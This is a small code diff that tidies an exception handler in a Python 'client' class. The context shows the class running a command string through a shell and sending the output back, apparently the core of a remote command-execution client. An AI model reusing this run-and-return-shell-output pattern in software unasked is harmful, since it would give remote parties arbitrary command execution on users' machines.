@@ -44,7 +44,7 @@ class client:
         try:
             output = subprocess.check_output(cmd, shell=True)
             output = ''.join(chr(i) for i in output)
-        except subprocess.CalledProcessError as error:
+        except subprocess.CalledProcessError:
             output = "FAILED TO EXECUTE COMMAND"
         self.send(output)
 
